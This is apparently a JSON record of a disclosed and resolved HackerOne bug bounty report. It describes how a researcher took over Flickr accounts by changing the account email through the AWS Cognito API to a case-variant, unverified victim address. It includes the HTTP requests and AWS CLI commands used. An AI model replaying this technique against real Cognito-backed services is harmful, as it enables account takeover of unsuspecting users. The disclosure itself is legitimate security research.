@@ -1,0 +1,156 @@
+{
+  "id": 1342088,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzQyMDg4",
+  "url": "https://hackerone.com/reports/1342088",
+  "title": "Flickr Account Takeover using AWS Cognito API",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-09-16T23:41:33.953Z",
+  "submitted_at": "2021-09-16T23:41:34.093Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lauritz",
+    "url": "/lauritz",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 32982,
+    "url": "https://hackerone.com/flickr",
+    "handle": "flickr",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/032/982/553e2f6c6682ebf04363717b01f5413d6e313e62_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/032/982/553e2f6c6682ebf04363717b01f5413d6e313e62_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Flickr",
+      "twitter_handle": "flickr",
+      "website": "https://www.flickr.com/",
+      "about": "Flickr is a global community united by photography.  It is the best place for inspiration, connection and sharing."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-12-18T00:35:49.568Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-12-18T00:23:34.727Z",
+  "team_member_agreed_on_going_public_at": "2021-12-18T00:35:49.269Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Flickr uses [Amazon Cognito](https://aws.amazon.com/de/cognito/) to implement its login functionality.\n\nFurthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito *User Pool* API.\n\nConsider we have the following accounts:\n1. flickr-benign@lauritz-holtmann.de (our victim)\n2. An arbitrary other account that is controlled by the attacker - in the following flickr-attacker@lauritz-holtmann.de\n\nAt first, the malicious actor needs to obtain an Amazon `access_token`. To do so, intercept the login request that is sent from https://identity.flickr.com/:\n```http\nPOST / HTTP/2\nHost: cognito-idp.us-east-1.amazonaws.com\n[...]\n\n{\n    \"AuthFlow\":\"USER_PASSWORD_AUTH\",\n    \"ClientId\":\"3ck15a1ov4f0d3o97vs3tbjb52\",\n    \"AuthParameters\":{\n        \"USERNAME\":\"flickr-attacker@lauritz-holtmann.de\",\n        \"PASSWORD\":\"[REDACTED]\",\n        \"DEVICE_KEY\":\"us-east-1_07032954-25bf-4781-b596-9d675d901072\"\n    },\n    \"ClientMetadata\":\n    {                \n    }\n}\n```\n\nIf the provided credentials for the attacker controlled account are valid, Amazon responds with tokens:\n```http\nHTTP/2 200 OK\nDate: Thu, 16 Sep 2021 22:51:36 GMT\n[...]\n\n{\n    \"AuthenticationResult\":    \n        {\n            \"AccessToken\":\"[REDACTED]\",\n            \"ExpiresIn\":3600,\n            \"IdToken\":\"[REDACTED]\",\n            \"RefreshToken\":\"[REDACTED]\",\n            \"TokenType\":\"Bearer\"\n        },\n    \"ChallengeParameters\":\n        {            \n        }\n}\n```\n\nThe `access_token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:\n\n```bash\n$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]\n{\n    \"Username\": \"e28c344[...]\",\n    \"UserAttributes\": [\n        {\n            \"Name\": \"sub\",\n            \"Value\": \"e28[...]\"\n        },\n        {\n            \"Name\": \"birthdate\",\n            \"Value\": \"1998-09-17\"\n        },\n        {\n            \"Name\": \"email_verified\",\n            \"Value\": \"true\"\n        },\n        {\n            \"Name\": \"locale\",\n            \"Value\": \"en-us\"\n        },\n        {\n            \"Name\": \"given_name\",\n            \"Value\": \"Axel\"\n        },\n        {\n            \"Name\": \"family_name\",\n            \"Value\": \"Attacker\"\n        },\n        {\n            \"Name\": \"email\",\n            \"Value\": \"flickr-attacker@lauritz-holtmann.de\"\n        }\n    ]\n}\n```\n\nUsing the API, one is able to alter some of the user attributes - including the linked e-mail address:\n```bash\n$ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de\n{\n    \"CodeDeliveryDetailsList\": [\n        {\n            \"Destination\": \"f***@l***.de\",\n            \"DeliveryMedium\": \"EMAIL\",\n            \"AttributeName\": \"email\"\n        }\n    ]\n}\n```\n\nNote that the registered address is **case sensitive**.\nAs the above output already indicates, at this stage, the e-mail address is not verified:\n```bash\n$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] \n{\n    \"Username\": \"e28c34[...]\",\n    \"UserAttributes\": [\n        {\n            \"Name\": \"sub\",\n            \"Value\": \"e2[...]\"\n        },\n        {\n            \"Name\": \"birthdate\",\n            \"Value\": \"1998-09-17\"\n        },\n        {\n            \"Name\": \"email_verified\",\n            \"Value\": \"false\"\n        },\n        {\n            \"Name\": \"locale\",\n            \"Value\": \"en-us\"\n        },\n        {\n            \"Name\": \"given_name\",\n            \"Value\": \"Axel\"\n        },\n        {\n            \"Name\": \"family_name\",\n            \"Value\": \"Attacker\"\n        },\n        {\n            \"Name\": \"email\",\n            \"Value\": \"flickr-Benign@lauritz-holtmann.de\"\n        }\n    ]\n}\n```\n\nStrikingly, it is still possible to login at Flickr using the case-sensitive, not-verified victim e-mail address using the attacker's password:\n{F1451108}\nAs the above video illustrates, the attacker has to make sure that within the outgoing HTTP request the capitalization of the e-mail address is as intended.\n\n## Conclusion\nThe aforementioned behavior can be tracked down to the following root issues\n1) Flickr does not expect e-mail addresses to be changed - still it is possible to change a user's address using the AWS Cognito API.\n2) Flickr does not check whether the e-mail address is verified on login\n3) Flickr normalizes the e-mail address received from AWS cognito, so that collisions are possible\n\n## Impact\n\nChained as shown above, the aforementioned  vulnerabilities can be used to takeover a user's account without any user interaction. \n\nA malicious solely needs to know the e-mail address that is linked within a victim's account to link a crafted e-mail address to their account that can then be used to takeover the victim's account.\n\n## Further Notices\nAll tests were performed against my user accounts. The user account patterns used were as follows:\n* lauritz+*@wearehackerone.com\n* *@lauritz-holtmann.de\n\nPlease let me know if you have any comments or questions.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1451108,
+      "file_name": "account-takeover.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6v8m4l9i1pnof59kjj30wnuxvat6?response-content-disposition=attachment%3B%20filename%3D%22account-takeover.mov%22%3B%20filename%2A%3DUTF-8%27%27account-takeover.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTPZNC2VJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151306Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJGMEQCIGOeIibeIlvktPdkcStOSMyU%2BbReWiC5UQVnbnI09Dl6AiAO%2B%2F%2FrSMhUx9tMfmb5wIaMiLJHENuUWzc5tsWbhQc32Cq7BQjm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM7lRrW6AbiHpdNCIHKo8Fj7UpLQFh4zMnY3jGeICstGG8v%2FPO1jy3cZ6pxg2iglcoO4hdCgLoCVfjbpXEr5oH6DeQ7QumDpuR88zYEQRX1fm%2B5a5s7zZseogxgL0yPGsD276UAhyRN06IGxX8kuQh%2BS8%2FHm5f9z7oeTCH8XjMPjqVQNS5JQXHFrq3ImSipju3FjHPHHH8lNCBOLo%2FkLjPVRHEpaTUT4C%2FNPN8xP%2Bq1IUC4ag3rNUCxlPI6T7081U6GmmOK8gUJoP1uVkbAq4LQRPW7tlB1OHN1ZMTsx13xfmDOLER8E2%2FAGzzK554W6X8Ctt7ilZo1GzZgDLjYCpCt0Gnne7879XyFq1n1xiUEHT7cSwo2Y9S35ht1R%2BnJQylPDRQPphpn%2B7O5KNquVqyorZm7H%2FJFNJ5Ia3P3Syy7ah5dPmvGzqOfLotWR%2BquHdXEOL2ImRrgO6Z7%2BU4d47EhdzaLDYS9f1AgftmrmfftYclEqPtKDJArjzwPLWgMfCchojdpYtq1lOrhkgR4cBYtNgz%2BjyoUtgmeQxR5NjLYRVURU96cLCpxfy69b90xiFVDxhiraDaNPrVm6GfVYzhOsd0XEYeLtrYo54dM0cH9kXYhpRv5Ju5EzVwA7Nv%2ByP9lkkh1XU64ar4vmguOsqeVElLDV8X7xz%2B3TODfas0HHViY%2FtdeZSEB99TwyrDaKSFmbqSUiaeLR3j78MN9FwFy6utGKRqvIe8L6dudilN6I8H5K8tZlrN9k320He41mPkysTJj9wP6S5YhlhUejzYfKszsitH%2BbLBuwS%2FnQbw2UKB7vFLB1B%2Bafnq7YdvxYO2%2BJNsKbTacfDyLuQQYFx5hBXBs9hgXGzuqRH7dvZOM%2FdtByRIyRLdJYhcVPVSxTDHz%2FzPBjqyAcY36EefNEghHwns%2Fo6uJ3AEdiibcs%2BhCBgAk%2B3aIepi4wvsnI7yj8jFI89K%2F22lH6wMbBDrmUekh0364CYpSweyTZtj1SD%2BHzwcBIRjsrqIDgyK6fHWvErhgkfhGFwVAQKLKHroZA1yYxJP22Ym86HUnEl1CLH6oUILUz%2Fus2VgH4vR%2FLgGUvteZpqXMlTlBo0bspGXBzMaA4sNGBThC6dWB6rZjuarVh7e5e%2BEy1DaGn8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f93b11f6f1b3b26ed0e43cac3e9ed03c8ad405ac27cda35c17ca464a735c673a",
+      "file_size": 30717613,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 436,
+  "voters": [
+    "alienisgrinding",
+    "datsuraku147",
+    "mtib",
+    "kanazawaaaa",
+    "thiezn",
+    "xchessy",
+    "f4rzads3c",
+    "orange303",
+    "aboalezz",
+    "act1on3",
+    "and 426 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 14539,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.flickr.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 116534,
+      "category": "researcher",
+      "content": "I published a deep dive into this vulnerability in a blog post: https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/\n\nThank you very much to @alexseville and team for the kind triage, kudos for applying a preliminary fix on the day of reporting! :)\n\nIf you have any comments or questions, feel free to reach out via Twitter: https://twitter.com/_lauritz_",
+      "updated_at": "2021-12-18T01:19:42.806Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 225466,
+        "username": "lauritz",
+        "name": "Lauritz Holtmann",
+        "bio": "",
+        "cleared": true,
+        "verified": true,
+        "website": "https://security.lauritz-holtmann.de",
+        "location": "",
+        "created_at": "2017-12-18T00:03:45.133Z",
+        "url": "https://hackerone.com/lauritz",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
